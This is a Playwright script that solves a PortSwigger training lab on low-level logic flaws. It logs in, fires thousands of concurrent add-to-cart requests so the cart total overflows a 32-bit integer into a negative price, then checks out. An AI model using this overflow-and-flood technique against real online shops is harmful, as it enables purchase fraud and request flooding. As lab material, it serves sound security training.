#!/usr/bin/env node
/**
 * Logic Flaws #5 - Low-level logic flaw
 * Integer overflow in cart total via massive quantity
 */
const { chromium } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
const LAB_PAGE = 'https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-low-level';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  
  try {
    console.log('[*] Login to PortSwigger...');
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await sleep(2000);
    
    console.log('[*] Launch lab...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const accessBtn = await page.locator('a:has-text("ACCESS THE LAB")').first();
    await accessBtn.click();
    await sleep(40000);
    
    let labUrl = null;
    for (const p of ctx.pages()) {
      const u = p.url();
      if (u.includes('web-security-academy.net')) { labUrl = u.replace(/\/$/, ''); break; }
    }
    if (!labUrl) throw new Error('No lab URL');
    console.log('[+] Lab URL:', labUrl);
    
    // Login as wiener
    await page.goto(labUrl + '/login', { waitUntil: 'domcontentloaded', timeout: 15000 });
    await sleep(2000);
    await page.fill('input[name=username]', 'wiener');
    await page.fill('input[name=password]', 'peter');
    await Promise.all([
      page.waitForNavigation({ timeout: 15000 }).catch(() => {}),
      page.click('button[type=submit]'),
    ]);
    await sleep(2000);
    
    // Add jacket to cart - many times using ctx.request to avoid page lifecycle issues
    console.log('[*] Adding jacket to cart with integer overflow...');
    
    // Leather jacket (productId=1). Price = $1337.00 = 133700 cents
    // 32-bit signed max: 2,147,483,647
    // quantity * 133700 > 2147483647 when quantity > 16064
    // We need total to overflow to negative. Quantity 99 max per request.
    // Total needed: approximately 385,482 (we'll go a bit more to be safe)
    // Via fetch with quantity 99 = 385,482 / 99 ≈ 3893 requests
    
    // Use direct ctx.request with the session cookie
    const cookies = await ctx.cookies(labUrl);
    const sessionCookie = cookies.find(c => c.name === 'session');
    if (!sessionCookie) throw new Error('No session cookie');
    
    const cookieHeader = `session=${sessionCookie.value}`;
    
    // Get cart for CSRF
    const cartResp = await ctx.request.get(labUrl + '/cart', {
      headers: { 'Cookie': cookieHeader },
    });
    const cartHtml = await cartResp.text();
    const csrfMatch = cartHtml.match(/name="csrf"\s+value="([^"]+)"/);
    
    // Fire many concurrent adds - concurrent fetches
    const BATCH_SIZE = 60;
    const TOTAL_BATCHES = 75;  // 60*99 * 75 = 445500 - should overflow
    
    for (let batch = 0; batch < TOTAL_BATCHES; batch++) {
      const promises = [];
      for (let i = 0; i < BATCH_SIZE; i++) {
        promises.push(
          ctx.request.post(labUrl + '/cart', {
            headers: { 
              'Cookie': cookieHeader,
              'Content-Type': 'application/x-www-form-urlencoded',
            },
            data: 'productId=1&redir=PRODUCT&quantity=99',
            maxRedirects: 0,
          }).catch(() => null)
        );
      }
      await Promise.all(promises);
      if (batch % 10 === 0) {
        console.log(`  Batch ${batch}/${TOTAL_BATCHES}`);
        // Check current cart
        const c = await ctx.request.get(labUrl + '/cart', { headers: { 'Cookie': cookieHeader } }).catch(() => null);
        if (c) {
          const h = await c.text();
          const totalMatch = h.match(/Total:\s*<[^>]+>\s*\$?([-\d,.]+)/);
          if (totalMatch) console.log(`  Total: ${totalMatch[1]}`);
        }
      }
    }
    
    // Check final cart total
    const finalCart = await ctx.request.get(labUrl + '/cart', { headers: { 'Cookie': cookieHeader } });
    const finalHtml = await finalCart.text();
    const totalMatch = finalHtml.match(/Total:.*?\$?([-\d,.]+)/);
    console.log('Final cart total:', totalMatch ? totalMatch[1] : 'unknown');
    
    // Find CSRF for checkout
    const finalCsrf = finalHtml.match(/name="csrf"\s+value="([^"]+)"/);
    if (!finalCsrf) throw new Error('No CSRF for checkout');
    
    // Checkout
    console.log('[*] Attempting checkout...');
    await ctx.request.post(labUrl + '/cart/checkout', {
      headers: {
        'Cookie': cookieHeader,
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      data: `csrf=${finalCsrf[1]}`,
      maxRedirects: 0,
    }).catch(() => null);
    
    await sleep(3000);
    
    // Verify
    console.log('[*] Verifying...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    const html = await page.content();
    const solved = html.includes('is-solved') || html.includes('Congratulations');
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
    process.exit(solved ? 0 : 1);
  } catch (e) {
    console.error(e.message);
    console.log('NOT SOLVED');
    process.exit(1);
  } finally {
    await browser.close().catch(() => {});
  }
}

main();
